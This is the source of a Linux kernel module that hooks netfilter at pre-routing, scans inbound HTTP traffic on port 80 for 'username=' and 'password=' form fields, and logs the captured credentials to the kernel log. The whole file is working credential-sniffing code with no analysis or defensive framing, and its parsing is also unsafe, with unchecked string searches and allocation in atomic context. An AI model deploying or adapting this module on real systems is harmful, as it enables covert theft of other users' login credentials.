#include <linux/ip.h>             
#include <linux/kernel.h> 
#include <linux/module.h> 
#include <linux/netdevice.h>      
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h> 
#include <linux/skbuff.h>         
#include <linux/udp.h>              
#include <linux/tcp.h>     
#include <linux/string.h>
#include <linux/slab.h>
MODULE_LICENSE("GPL");

static struct nf_hook_ops netfilter_ops;                                                
struct sk_buff *sock_buff;                              
struct udphdr *udp_header;              
struct tcphdr * tcp_header;                
unsigned int main_hook(void * hooknum,
		struct sk_buff *skb,
		const struct nf_hook_state *state)
{
	char * data; 
	char *tmp;
	char *name;
	char *pwd;
	char *username;
	char *password;
	sock_buff = skb;
	if(!sock_buff){ printk("buffer error!\n"); return NF_ACCEPT; }                   


	if(ip_hdr(sock_buff)->protocol == 6)
	{
		tcp_header = (struct tcphdr *)(sock_buff->data + (ip_hdr(sock_buff)->ihl*4));
		data = (char *)((unsigned long)tcp_header + (unsigned long)(tcp_header->doff * 4));
		if((tcp_header->dest)==htons(80) )
		{
			if(strstr(data,"username=")==NULL || strstr(data,"password")==NULL)
					return NF_ACCEPT;
			name = strstr(data,"username=");
			name +=9;
			tmp = strstr(name,"&");
			int len = tmp - name;
			if ((username = kmalloc(len + 1, GFP_KERNEL)) == NULL)
         			 return NF_ACCEPT;
        		memset(username, 0x00, len + 1);
			for(int i = 0;i< len ;i++){
				*(username + i) = name[i];
			}
			pwd = strstr(name,"&password=");
			pwd +=10;
		        tmp = strstr(pwd,"&");
			len = tmp - pwd;
			if ((password = kmalloc(len + 1, GFP_KERNEL)) == NULL)
                                 return NF_ACCEPT;
                        memset(password, 0x00, len + 1);
                        for(int i = 0;i< len ;i++){
                                *(password + i) = pwd[i];
                        }
	
			printk("username is %s,password is %s",username,password);
			
			kfree(username);
			kfree(password);


	
		}
	}


	return NF_ACCEPT;
}
int init_module()
{
	netfilter_ops.hook              =       main_hook;
	netfilter_ops.pf                =       PF_INET;        
	netfilter_ops.hooknum           =       NF_INET_PRE_ROUTING;
	netfilter_ops.priority          =       NF_IP_PRI_FIRST;
	nf_register_net_hook(&init_net,&netfilter_ops);
	printk("Filter Password!\n");
	return 0;
}
void cleanup_module() { nf_unregister_net_hook(&init_net,&netfilter_ops); 
printk("bye");
}

MODULE_LICENSE("GPL");